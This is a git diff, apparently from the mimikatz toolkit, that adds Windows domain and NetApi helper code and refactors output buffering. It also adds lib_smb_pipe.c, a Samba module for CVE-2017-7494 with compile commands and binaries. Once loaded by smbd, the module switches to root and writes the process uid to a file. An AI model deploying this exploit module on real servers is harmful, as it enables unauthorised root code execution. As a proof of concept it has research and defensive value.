+#include "kuhl_m.h"
+#include "../../modules/asn1/kull_m_kerberos_asn1.h"
+#include "../../modules/asn1/kull_m_kerberos_asn1_authinfos.h"
+#include "../../modules/kull_m_string.h"
+#include "../../modules/kull_m_samlib.h"
+#include "codecs/common.h"
+#include <Winldap.h>
+#include <Winber.h>
+
+const KUHL_M kuhl_m_misc;
+
+NTSTATUS kuhl_m_misc_changepw(int argc, wchar_t * argv[]);
+NTSTATUS kuhl_m_misc_convert(int argc, wchar_t * argv[]);
+NTSTATUS kuhl_m_misc_storm(int argc, wchar_t * argv[]);
+NTSTATUS kuhl_m_misc_arch(int argc, wchar_t * argv[]);
+
+typedef struct _KULL_M_KADMIN_PASSWD_ERR{
+	DWORD	id;
+	PCWSTR	name;
+} KULL_M_KADMIN_PASSWD_ERR, *PKULL_M_KADMIN_PASSWD_ERR;
+
+PCWSTR kull_m_kadmin_passwd_err_to_string(DWORD id);
+void kull_m_kadmin_passwd_retFromKadmin(_octet1 * data);
+
+#define DIRTY_ASN1_ID_GENERAL_STRING	0x1b
+#define DIRTY_ASN1_ID_GENERALIZED_TIME	0x18
+#define DIRTY_ASN1_ID_SEQUENCE			0x30
+#define DIRTY_ASN1_MASK_APPLICATION		0x60
+#define DIRTY_ASN1_MASK_CONTEXT			0xa0
+
+#define MAKE_APP_TAG(AppId)		((ber_tag_t) (DIRTY_ASN1_MASK_APPLICATION | AppId))
+#define MAKE_CTX_TAG(CtxId)		((ber_tag_t) (DIRTY_ASN1_MASK_CONTEXT | CtxId))
+
+typedef struct _KIWI_USERNAMEA {
+	LIST_ENTRY navigator;
+	ANSI_STRING username;
+} KIWI_USERNAMEA, *PKIWI_USERNAMEA;
+
+BOOL kuhl_m_misc_storm_add(PCUNICODE_STRING name);
+PBERVAL kuhl_m_misc_storm_giveBERForUser(PCANSI_STRING user);
+DWORD kuhl_m_misc_storm_giveUsersForServer(PCWSTR server);
+
+//static const RPC_SYNTAX_IDENTIFIER AbstractSyntax =			{{0xe1af8308, 0x5d1f, 0x11c9, {0x91, 0xa4, 0x08, 0x00, 0x2b, 0x14, 0xa0, 0xfa}}, {3, 0}};
 //static const RPC_SYNTAX_IDENTIFIER NdrTransferSyntax =		{{0x8a885d04, 0x1ceb, 0x11c9, {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}}, {2, 0}};
-//static const RPC_SYNTAX_IDENTIFIER Ndr64TransferSyntax =	{{0x71710533, 0xbeba, 0x4937, {0x83, 0x19, 0xb5, 0xdb, 0xef, 0x9c, 0xcc, 0x36}}, {1, 0}};
-
+//static const RPC_SYNTAX_IDENTIFIER Ndr64TransferSyntax =	{{0x71710533, 0xbeba, 0x4937, {0x83, 0x19, 0xb5, 0xdb, 0xef, 0x9c, 0xcc, 0x36}}, {1, 0}};
+
 #define RPC_CONT_DEF_RESULT_acceptance									0
 #define RPC_CONT_DEF_RESULT_user_rejection								1
 #define RPC_CONT_DEF_RESULT_provider_rejection							2
@@ -60,9 +60,9 @@ DWORD kuhl_m_misc_storm_giveUsersForServer(PCWSTR server);
 #define RPC_PROVIDER_REASON_local_limit_exceeded						3
 
 #define RPC_PDU_bind		11
-#define RPC_PDU_bind_ack	12
-
-#pragma pack(push, 1)
+#define RPC_PDU_bind_ack	12
+
+#pragma pack(push, 1)
 typedef struct _p_cont_elem_t {
 	USHORT p_cont_id;
 	UCHAR n_transfer_syn; /* number of items */
@@ -91,8 +91,8 @@ typedef struct _rpcconn_bind_hdr_t {
 	USHORT max_recv_frag; /* 18:02 max receive frag size, bytes */
 	DWORD assoc_group_id; /* 20:04 incarnation of client-server assoc group presentation context list */
 	p_cont_list_t p_context_elem; /* variable size */
-} rpcconn_bind_hdr_t, *prpcconn_bind_hdr_t;
-
+} rpcconn_bind_hdr_t, *prpcconn_bind_hdr_t;
+
 typedef struct _p_result_t {
 	USHORT result;
 	USHORT reason; /* only relevant if result != acceptance */
@@ -109,8 +109,8 @@ typedef struct _p_result_list_t {
 typedef struct _port_any_t {
 	USHORT length;
 	char /*[size_is(length)]*/ port_spec[ANYSIZE_ARRAY];
-} port_any_t, *pport_any_t;
-
+} port_any_t, *pport_any_t;
+
 typedef struct _rpcconn_bind_ack_hdr_t {
 	UCHAR rpc_vers; /* 00:01 RPC version */
 	UCHAR rpc_vers_minor; /* 01:01 minor version */
@@ -126,5 +126,5 @@ typedef struct _rpcconn_bind_ack_hdr_t {
 	port_any_t sec_addr; /* 24:yy optional secondary address for process incarnation; local port part of address only */
 	/* restore 4-octet alignment */
 	p_result_list_t p_result_list; /* variable size */
-} rpcconn_bind_ack_hdr_t, *prpcconn_bind_ack_hdr_t;
+} rpcconn_bind_ack_hdr_t, *prpcconn_bind_ack_hdr_t;
 #pragma pack(pop)
\ No newline at end of file
diff --git a/modules/kull_m_net.c b/modules/kull_m_net.c
new file mode 100644
index 0000000..09f2f53
--- /dev/null
+++ b/modules/kull_m_net.c
@@ -0,0 +1,53 @@
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#include "kull_m_net.h"
+
+BOOL kull_m_net_getCurrentDomainInfo(PPOLICY_DNS_DOMAIN_INFO * pDomainInfo)
+{
+	BOOL status = FALSE;
+	LSA_HANDLE hLSA;
+	LSA_OBJECT_ATTRIBUTES oaLsa = {0};
+
+	if(NT_SUCCESS(LsaOpenPolicy(NULL, &oaLsa, POLICY_VIEW_LOCAL_INFORMATION, &hLSA)))
+	{
+		status = NT_SUCCESS(LsaQueryInformationPolicy(hLSA, PolicyDnsDomainInformation, (PVOID *) pDomainInfo));
+		LsaClose(hLSA);
+	}
+	return status;
+}
+
+BOOL kull_m_net_CreateWellKnownSid(WELL_KNOWN_SID_TYPE WellKnownSidType, PSID DomainSid, PSID * pSid)
+{
+	BOOL status = FALSE;
+	DWORD szNeeded = 0, dwError;
+	CreateWellKnownSid(WellKnownSidType, DomainSid, NULL, &szNeeded);
+	dwError = GetLastError();
+	if((dwError == ERROR_INVALID_PARAMETER) || (dwError == ERROR_INSUFFICIENT_BUFFER))
+		if(*pSid = (PSID) LocalAlloc(LPTR, szNeeded))
+			if(!(status = CreateWellKnownSid(WellKnownSidType, DomainSid, *pSid, &szNeeded)))
+				*pSid = LocalFree(*pSid);
+	return status;
+}
+
+BOOL kull_m_net_getDC(LPCWSTR fullDomainName, DWORD altFlags, LPWSTR * fullDCName)
+{
+	BOOL status = FALSE;
+	DWORD ret, size;
+	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
+	ret = DsGetDcName(NULL, fullDomainName, NULL, NULL, altFlags | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
+	if(ret == ERROR_SUCCESS)
+	{
+		size = (DWORD) (wcslen(cInfo->DomainControllerName + 2) + 1) * sizeof(wchar_t);
+		if(*fullDCName = (wchar_t *) LocalAlloc(LPTR, size))
+		{
+			status = TRUE;
+			RtlCopyMemory(*fullDCName, cInfo->DomainControllerName + 2, size);
+		}
+		NetApiBufferFree(cInfo);
+	}
+	else PRINT_ERROR(L"DsGetDcName: %u\n", ret);
+	return status;
+}
\ No newline at end of file
diff --git a/modules/kull_m_net.h b/modules/kull_m_net.h
new file mode 100644
index 0000000..f0dd281
--- /dev/null
+++ b/modules/kull_m_net.h
@@ -0,0 +1,202 @@
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#pragma once
+#include "globals.h"
+#include <DsGetDC.h>
+
+extern DWORD WINAPI NetApiBufferFree (IN LPVOID Buffer);
+
+BOOL kull_m_net_getCurrentDomainInfo(PPOLICY_DNS_DOMAIN_INFO * pDomainInfo);
+BOOL kull_m_net_CreateWellKnownSid(WELL_KNOWN_SID_TYPE WellKnownSidType, PSID DomainSid, PSID * pSid);
+BOOL kull_m_net_getDC(LPCWSTR fullDomainName, DWORD altFlags, LPWSTR * fullDCName);
+
+#define NET_API_STATUS          DWORD
+#define NET_API_FUNCTION    __stdcall
+#define LMSTR   LPWSTR
+#define MAX_PREFERRED_LENGTH    ((DWORD) -1)
+
+#define NERR_Success 0 
+
+typedef struct _TIME_OF_DAY_INFO {
+	DWORD tod_elapsedt;
+	DWORD tod_msecs;
+	DWORD tod_hours;
+	DWORD tod_mins;
+	DWORD tod_secs;
+	DWORD tod_hunds;
+	LONG  tod_timezone;
+	DWORD tod_tinterval;
+	DWORD tod_day;
+	DWORD tod_month;
+	DWORD tod_year;
+	DWORD tod_weekday;
+} TIME_OF_DAY_INFO, *PTIME_OF_DAY_INFO, *LPTIME_OF_DAY_INFO;
+
+typedef struct _SESSION_INFO_10 {
+	LMSTR sesi10_cname;
+	LMSTR sesi10_username;
+	DWORD sesi10_time;
+	DWORD sesi10_idle_time;
+} SESSION_INFO_10, *PSESSION_INFO_10, *LPSESSION_INFO_10;
+
+typedef struct _WKSTA_USER_INFO_1 {
+	LMSTR wkui1_username;
+	LMSTR wkui1_logon_domain;
+	LMSTR wkui1_oth_domains;
+	LMSTR wkui1_logon_server;
+}WKSTA_USER_INFO_1, *PWKSTA_USER_INFO_1, *LPWKSTA_USER_INFO_1;
+
+#define SERVICE_WORKSTATION       TEXT("LanmanWorkstation")
+#define SERVICE_SERVER            TEXT("LanmanServer")
+
+typedef struct _STAT_WORKSTATION_0 {
+	LARGE_INTEGER StatisticsStartTime;
+	LARGE_INTEGER BytesReceived;
+	LARGE_INTEGER SmbsReceived;
+	LARGE_INTEGER PagingReadBytesRequested;
+	LARGE_INTEGER NonPagingReadBytesRequested;
+	LARGE_INTEGER CacheReadBytesRequested;
+	LARGE_INTEGER NetworkReadBytesRequested;
+	LARGE_INTEGER BytesTransmitted;
+	LARGE_INTEGER SmbsTransmitted;
+	LARGE_INTEGER PagingWriteBytesRequested;
+	LARGE_INTEGER NonPagingWriteBytesRequested;
+	LARGE_INTEGER CacheWriteBytesRequested;
+	LARGE_INTEGER NetworkWriteBytesRequested;
+	DWORD         InitiallyFailedOperations;
+	DWORD         FailedCompletionOperations;
+	DWORD         ReadOperations;
+	DWORD         RandomReadOperations;
+	DWORD         ReadSmbs;
+	DWORD         LargeReadSmbs;
+	DWORD         SmallReadSmbs;
+	DWORD         WriteOperations;
+	DWORD         RandomWriteOperations;
+	DWORD         WriteSmbs;
+	DWORD         LargeWriteSmbs;
+	DWORD         SmallWriteSmbs;
+	DWORD         RawReadsDenied;
+	DWORD         RawWritesDenied;
+	DWORD         NetworkErrors;
+	DWORD         Sessions;
+	DWORD         FailedSessions;
+	DWORD         Reconnects;
+	DWORD         CoreConnects;
+	DWORD         Lanman20Connects;
+	DWORD         Lanman21Connects;
+	DWORD         LanmanNtConnects;
+	DWORD         ServerDisconnects;
+	DWORD         HungSessions;
+	DWORD         UseCount;
+	DWORD         FailedUseCount;
+	DWORD         CurrentCommands;
+} STAT_WORKSTATION_0, *PSTAT_WORKSTATION_0, *LPSTAT_WORKSTATION_0;
+
+typedef struct _STAT_SERVER_0 {
+	DWORD sts0_start;
+	DWORD sts0_fopens;
+	DWORD sts0_devopens;
+	DWORD sts0_jobsqueued;
+	DWORD sts0_sopens;
+	DWORD sts0_stimedout;
+	DWORD sts0_serrorout;
+	DWORD sts0_pwerrors;
+	DWORD sts0_permerrors;
+	DWORD sts0_syserrors;
+	DWORD sts0_bytessent_low;
+	DWORD sts0_bytessent_high;
+	DWORD sts0_bytesrcvd_low;
+	DWORD sts0_bytesrcvd_high;
+	DWORD sts0_avresponse;
+	DWORD sts0_reqbufneed;
+	DWORD sts0_bigbufneed;
+} STAT_SERVER_0, *PSTAT_SERVER_0, *LPSTAT_SERVER_0;
+
+#define STYPE_DISKTREE          0
+#define STYPE_PRINTQ            1
+#define STYPE_DEVICE            2
+#define STYPE_IPC               3
+
+#define STYPE_MASK              0x000000FF              // AND with shi_type to
+
+#define STYPE_RESERVED1         0x01000000              // Reserved for internal processing
+#define STYPE_RESERVED2         0x02000000            
+#define STYPE_RESERVED3         0x04000000
+#define STYPE_RESERVED4         0x08000000
+#define STYPE_RESERVED_ALL      0x3FFFFF00
+
+#define STYPE_TEMPORARY         0x40000000
+#define STYPE_SPECIAL           0x80000000
+
+typedef struct _SHARE_INFO_502 {
+	LMSTR     shi502_netname;
+	DWORD     shi502_type;
+	LMSTR     shi502_remark;
+	DWORD     shi502_permissions;
+	DWORD     shi502_max_uses;
+	DWORD     shi502_current_uses;
+	LMSTR     shi502_path;
+	LMSTR     shi502_passwd;
+	DWORD     shi502_reserved;
+	PSECURITY_DESCRIPTOR  shi502_security_descriptor;
+} SHARE_INFO_502, *PSHARE_INFO_502, *LPSHARE_INFO_502;
+
+typedef struct _SERVER_INFO_102 {
+	DWORD          sv102_platform_id;
+	LMSTR          sv102_name;
+	DWORD          sv102_version_major;
+	DWORD          sv102_version_minor;
+	DWORD          sv102_type;
+	LMSTR          sv102_comment;
+	DWORD          sv102_users;
+	LONG           sv102_disc;
+	BOOL           sv102_hidden;
+	DWORD          sv102_announce;
+	DWORD          sv102_anndelta;
+	DWORD          sv102_licenses;
+	LMSTR          sv102_userpath;
+} SERVER_INFO_102, *PSERVER_INFO_102, *LPSERVER_INFO_102;
+
+#define SV_TYPE_WORKSTATION         0x00000001
+#define SV_TYPE_SERVER              0x00000002
+#define SV_TYPE_SQLSERVER           0x00000004
+#define SV_TYPE_DOMAIN_CTRL         0x00000008
+#define SV_TYPE_DOMAIN_BAKCTRL      0x00000010
+#define SV_TYPE_TIME_SOURCE         0x00000020
+#define SV_TYPE_AFP                 0x00000040
+#define SV_TYPE_NOVELL              0x00000080
+#define SV_TYPE_DOMAIN_MEMBER       0x00000100
+#define SV_TYPE_PRINTQ_SERVER       0x00000200
+#define SV_TYPE_DIALIN_SERVER       0x00000400
+#define SV_TYPE_XENIX_SERVER        0x00000800
+#define SV_TYPE_SERVER_UNIX         SV_TYPE_XENIX_SERVER
+#define SV_TYPE_NT                  0x00001000
+#define SV_TYPE_WFW                 0x00002000
+#define SV_TYPE_SERVER_MFPN         0x00004000
+#define SV_TYPE_SERVER_NT           0x00008000
+#define SV_TYPE_POTENTIAL_BROWSER   0x00010000
+#define SV_TYPE_BACKUP_BROWSER      0x00020000
+#define SV_TYPE_MASTER_BROWSER      0x00040000
+#define SV_TYPE_DOMAIN_MASTER       0x00080000
+#define SV_TYPE_SERVER_OSF          0x00100000
+#define SV_TYPE_SERVER_VMS          0x00200000
+#define SV_TYPE_WINDOWS             0x00400000  /* Windows95 and above */
+#define SV_TYPE_DFS                 0x00800000  /* Root of a DFS tree */
+#define SV_TYPE_CLUSTER_NT          0x01000000  /* NT Cluster */
+#define SV_TYPE_TERMINALSERVER      0x02000000  /* Terminal Server(Hydra) */
+#define SV_TYPE_CLUSTER_VS_NT       0x04000000  /* NT Cluster Virtual Server Name */
+#define SV_TYPE_DCE                 0x10000000  /* IBM DSS (Directory and Security Services) or equivalent */
+#define SV_TYPE_ALTERNATE_XPORT     0x20000000  /* return list for alternate transport */
+#define SV_TYPE_LOCAL_LIST_ONLY     0x40000000  /* Return local list only */
+#define SV_TYPE_DOMAIN_ENUM         0x80000000
+#define SV_TYPE_ALL                 0xFFFFFFFF  /* handy for NetServerEnum2 */
+
+NET_API_STATUS NET_API_FUNCTION NetSessionEnum(IN LMSTR servername, IN LMSTR UncClientName, IN LMSTR username, IN DWORD level, OUT LPBYTE *bufptr, IN DWORD prefmaxlen, OUT LPDWORD entriesread, OUT LPDWORD totalentries, IN OUT LPDWORD resume_handle);
+NET_API_STATUS NET_API_FUNCTION NetWkstaUserEnum(IN LMSTR servername, IN DWORD level, OUT LPBYTE *bufptr, IN DWORD prefmaxlen, OUT LPDWORD entriesread, OUT LPDWORD totalentries, IN OUT LPDWORD resumehandle);
+NET_API_STATUS NET_API_FUNCTION NetShareEnum(IN LMSTR servername, IN DWORD level, OUT LPBYTE *bufptr, IN DWORD prefmaxlen, OUT LPDWORD entriesread, OUT LPDWORD totalentries, IN OUT LPDWORD resume_handle);
+NET_API_STATUS NET_API_FUNCTION NetStatisticsGet(IN LPWSTR server, IN LPWSTR service, IN DWORD  level, IN DWORD  options, OUT LPBYTE *bufptr);
+NET_API_STATUS NET_API_FUNCTION NetRemoteTOD(IN LPCWSTR UncServerName, OUT PTIME_OF_DAY_INFO *pToD);
+NET_API_STATUS NET_API_FUNCTION NetServerGetInfo(IN LPWSTR servername, IN DWORD  level, OUT LPBYTE *bufptr);
\ No newline at end of file
diff --git a/modules/kull_m_output.c b/modules/kull_m_output.c
index d8e85e3..ffff263 100644
--- a/modules/kull_m_output.c
+++ b/modules/kull_m_output.c
@@ -1,93 +1,110 @@
-/*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
-	Licence : https://creativecommons.org/licenses/by/4.0/
-*/
-#include "kull_m_output.h"
-
-FILE * logfile = NULL;
-#ifdef _WINDLL
-wchar_t * outputBuffer = NULL;
-size_t outputBufferElements = 0, outputBufferElementsPosition = 0;
-#endif
-
-void kprintf(PCWCHAR format, ...)
-{
-#ifdef _WINDLL
-	int varBuf;
-	size_t tempSize;
-#endif
-	va_list args;
-	va_start(args, format);
-#ifndef _WINDLL
-	vwprintf(format, args);
-	fflush(stdout);
-#else
-	if(outputBuffer)
-	{
-		varBuf = _vscwprintf(format, args);
-		if(varBuf > 0)
-		{
-			if((size_t) varBuf > (outputBufferElements - outputBufferElementsPosition - 1)) // NULL character
-			{
-				tempSize = (outputBufferElements + varBuf + 1) * 2; // * 2, just to be cool
-				if(outputBuffer = (wchar_t *) LocalReAlloc(outputBuffer, tempSize * sizeof(wchar_t), LMEM_MOVEABLE))
-					outputBufferElements = tempSize;
-			}
-			varBuf = vswprintf_s(outputBuffer + outputBufferElementsPosition, outputBufferElements - outputBufferElementsPosition, format, args);
-			if(varBuf > 0)
-				outputBufferElementsPosition += varBuf;
-		}
-	}
-#endif
-	if(logfile)
-		vfwprintf(logfile, format, args);
-	va_end(args);
-	fflush(logfile);
-}
-
-void kprintf_inputline(PCWCHAR format, ...)
-{
-	va_list args;
-	va_start(args, format);
-	if(logfile)
-		vfwprintf(logfile, format, args);
-	va_end(args);
-	fflush(logfile);
-}
-
-BOOL kull_m_output_file(PCWCHAR file)
-{
-	BOOL status = FALSE;
-	FILE * newlog = NULL;
-
-	if(file)
-#pragma warning(push)
-#pragma warning(disable:4996)
-		newlog = _wfopen(file, L"a"); // XP does not like _wfopen_s
-#pragma warning(pop)
-	if(newlog || !file)
-	{
-		if(logfile)
-			fclose(logfile);
-		logfile = newlog;
-	}
-	return (!file || (file && logfile));
-}
-
-int previousStdOut, previousStdErr;
-UINT previousConsoleOutput;
-void kull_m_output_init()
-{
-	previousStdOut = _setmode(_fileno(stdout), _O_U8TEXT);
-	previousStdErr = _setmode(_fileno(stderr), _O_U8TEXT);
-	previousConsoleOutput = GetConsoleOutputCP();
-	SetConsoleOutputCP(CP_UTF8);
-}
-
-void kull_m_output_clean()
-{
-	_setmode(_fileno(stdout), previousStdOut);
-	_setmode(_fileno(stderr), previousStdErr);
-	SetConsoleOutputCP(previousConsoleOutput);
-}
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#include "kull_m_output.h"
+
+FILE * logfile = NULL;
+wchar_t * outputBuffer = NULL;
+size_t outputBufferElements = 0, outputBufferElementsPosition = 0;
+
+void kprintf(PCWCHAR format, ...)
+{
+	int varBuf;
+	size_t tempSize;
+	wchar_t * tmpBuffer;
+	va_list args;
+	va_start(args, format);
+
+	if(outputBuffer)
+	{
+		varBuf = _vscwprintf(format, args);
+		if(varBuf > 0)
+		{
+			if((size_t) varBuf > (outputBufferElements - outputBufferElementsPosition - 1)) // NULL character
+			{
+				tempSize = (outputBufferElements + varBuf + 1) * 2; // * 2, just to be cool
+				if(tmpBuffer = (wchar_t *) LocalAlloc(LPTR, tempSize * sizeof(wchar_t)))
+				{
+					RtlCopyMemory(tmpBuffer, outputBuffer, outputBufferElementsPosition * sizeof(wchar_t));
+					LocalFree(outputBuffer);
+					outputBuffer = tmpBuffer;
+					outputBufferElements = tempSize;
+				}
+				else wprintf(L"Erreur LocalAlloc: %u\n", GetLastError());
+				//if(outputBuffer = (wchar_t *) LocalReAlloc(outputBuffer, tempSize * sizeof(wchar_t), LPTR))
+				//	outputBufferElements = tempSize;
+				//else wprintf(L"Erreur ReAlloc: %u\n", GetLastError());
+			}
+			varBuf = vswprintf_s(outputBuffer + outputBufferElementsPosition, outputBufferElements - outputBufferElementsPosition, format, args);
+			if(varBuf > 0)
+				outputBufferElementsPosition += varBuf;
+		}
+	}
+#ifndef _WINDLL
+	else
+	{
+		vwprintf(format, args);
+		fflush(stdout);
+	}
+#endif
+	if(logfile)
+	{
+		vfwprintf(logfile, format, args);
+		fflush(logfile);
+	}
+	va_end(args);
+}
+
+void kprintf_inputline(PCWCHAR format, ...)
+{
+	va_list args;
+	va_start(args, format);
+	if(logfile)
+	{
+		vfwprintf(logfile, format, args);
+		fflush(logfile);
+	}
+	va_end(args);
+}
+
+BOOL kull_m_output_file(PCWCHAR file)
+{
+	BOOL status = FALSE;
+	FILE * newlog = NULL;
+
+	if(file)
+#pragma warning(push)
+#pragma warning(disable:4996)
+		newlog = _wfopen(file, L"a"); // XP does not like _wfopen_s
+#pragma warning(pop)
+	if(newlog || !file)
+	{
+		if(logfile)
+			fclose(logfile);
+		logfile = newlog;
+	}
+	return (!file || (file && logfile));
+}
+
+int previousStdOut, previousStdErr;
+UINT previousConsoleOutput;
+void kull_m_output_init()
+{
+#ifndef _WINDLL
+	previousStdOut = _setmode(_fileno(stdout), _O_U8TEXT);
+	previousStdErr = _setmode(_fileno(stderr), _O_U8TEXT);
+	previousConsoleOutput = GetConsoleOutputCP();
+	SetConsoleOutputCP(CP_UTF8);
+#endif
+}
+
+void kull_m_output_clean()
+{
+#ifndef _WINDLL
+	_setmode(_fileno(stdout), previousStdOut);
+	_setmode(_fileno(stderr), previousStdErr);
+	SetConsoleOutputCP(previousConsoleOutput);
+#endif
+}
\ No newline at end of file
diff --git a/modules/kull_m_output.h b/modules/kull_m_output.h
index 1586215..fca5e47 100644
--- a/modules/kull_m_output.h
+++ b/modules/kull_m_output.h
@@ -1,23 +1,23 @@
-/*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
-	Licence : https://creativecommons.org/licenses/by/4.0/
-*/
-#pragma once
-#include "globals.h"
-#include <io.h>
-#include <fcntl.h>
-
-FILE * logfile;
-#ifdef _WINDLL
-wchar_t * outputBuffer;
-size_t outputBufferElements, outputBufferElementsPosition;
-#endif
-
-void kprintf(PCWCHAR format, ...);
-void kprintf_inputline(PCWCHAR format, ...);
-
-BOOL kull_m_output_file(PCWCHAR file);
-
-void kull_m_output_init();
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#pragma once
+#include "globals.h"
+#include <io.h>
+#include <fcntl.h>
+
+FILE * logfile;
+//#ifdef _WINDLL
+wchar_t * outputBuffer;
+size_t outputBufferElements, outputBufferElementsPosition;
+//#endif
+
+void kprintf(PCWCHAR format, ...);
+void kprintf_inputline(PCWCHAR format, ...);
+
+BOOL kull_m_output_file(PCWCHAR file);
+
+void kull_m_output_init();
 void kull_m_output_clean();
\ No newline at end of file
diff --git a/samba/lib_smb_pipe.c b/samba/lib_smb_pipe.c
new file mode 100644
index 0000000..a23669e
--- /dev/null
+++ b/samba/lib_smb_pipe.c
@@ -0,0 +1,127 @@
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+
+	Samba module for CVE-2017-7494 ( https://www.samba.org/samba/security/CVE-2017-7494.html )
+
+	cc -m32 -shared -o lib_smb_pipe_x86.so -fPIC lib_smb_pipe.c
+	cc -m64 -shared -o lib_smb_pipe_x64.so -fPIC lib_smb_pipe.c
+*/
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <string.h>
+#include <dlfcn.h>
+#include <unistd.h>
+#include <pwd.h>
+#include <time.h>
+#include <libgen.h>
+
+#define SMB_RPC_INTERFACE_VERSION 1
+#define NT_STATUS_UNSUCCESSFUL (0xC0000000 | 0x00000001)
+typedef uint32_t NTSTATUS;
+
+struct GUID {
+	uint32_t time_low;
+	uint16_t time_mid;
+	uint16_t time_hi_and_version;
+	uint8_t clock_seq[2];
+	uint8_t node[6];
+};
+
+struct ndr_syntax_id {
+	struct GUID uuid;
+	uint32_t if_version;
+};
+
+struct ndr_interface_table {
+	const char *name;
+	struct ndr_syntax_id syntax_id;
+	const char *helpstring;
+	uint32_t num_calls;
+	const struct ndr_interface_call *calls;
+	const struct ndr_interface_string_array *endpoints;
+	const struct ndr_interface_string_array *authservices;
+};
+
+extern NTSTATUS rpc_srv_register(int version, const char *clnt, const char *srv, const struct ndr_interface_table *iface, const void /*struct api_struct*/ *cmds, int size, const void /*struct rpc_srv_callbacks*/ *rpc_srv_cb);
+extern bool change_to_root_user(void);
+
+static void *cmds;
+static struct ndr_interface_table ndr_table_libpoc = {
+	.name		= NULL,
+	.syntax_id	= {{0xdeadbeef, 0x0000, 0x0000, {0x00, 0x00}, {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}}, 1},
+	.helpstring	= NULL,
+	.num_calls	= 0,
+	.calls		= NULL,
+	.endpoints	= NULL,
+	.authservices	= NULL
+};
+
+static char * path_dir_combine(const char *path, const char *file);
+
+NTSTATUS samba_init_module(void)
+{
+	NTSTATUS status = NT_STATUS_UNSUCCESSFUL;	
+	Dl_info info;
+	FILE *file;
+	char *filename;
+	struct passwd *pw, *epw;
+
+	change_to_root_user();
+	if(dladdr(samba_init_module, &info))
+	{
+		pw = getpwuid(getuid());
+		epw = getpwuid(geteuid());
+		if(filename = path_dir_combine(info.dli_fname, "myid.txt"))
+		{
+			file = fopen(filename, "w");
+			if(file)
+			{		
+				fprintf(file, "[smbd with module %s] uid: %u (%s) / euid: %u (%s)\n", info.dli_fname, pw->pw_uid, pw->pw_name, epw->pw_uid, epw->pw_name);
+				fclose(file);
+			}
+			free(filename);
+		}
+
+		srand(time(NULL));
+		ndr_table_libpoc.syntax_id.uuid.time_mid = rand() % 0x10000;
+		ndr_table_libpoc.syntax_id.uuid.time_hi_and_version = rand() % 0x10000;
+		status = rpc_srv_register(SMB_RPC_INTERFACE_VERSION, info.dli_fname, info.dli_fname, &ndr_table_libpoc, &cmds, 0, NULL);
+	}
+	return status;
+}
+
+NTSTATUS init_samba_module(void)
+{
+	return samba_init_module();
+}
+
+static char * path_dir_combine(const char *path, const char *file)
+{
+	char *result = NULL, *duppath, *mypath;
+	size_t len;
+	if(duppath = strdup(path))
+	{
+		if(mypath = dirname(duppath))
+		{
+		 	len = snprintf(NULL, 0, "%s/%s", mypath, file);
+			if(len > 0)
+			{
+				if(result = malloc(len + 1))
+				{
+					if(snprintf(result, len + 1, "%s/%s", mypath, file) < len)
+					{
+						free(result);
+						result = NULL;
+					}
+				}
+			}
+		}
+		free(duppath);
+	}
+	return result;
+}
diff --git a/samba/lib_smb_pipe_x64.so b/samba/lib_smb_pipe_x64.so
new file mode 100644
index 0000000..8c323de
Binary files /dev/null and b/samba/lib_smb_pipe_x64.so differ
diff --git a/samba/lib_smb_pipe_x86.so b/samba/lib_smb_pipe_x86.so
new file mode 100644
index 0000000..ccc2e2a
Binary files /dev/null and b/samba/lib_smb_pipe_x86.so differ
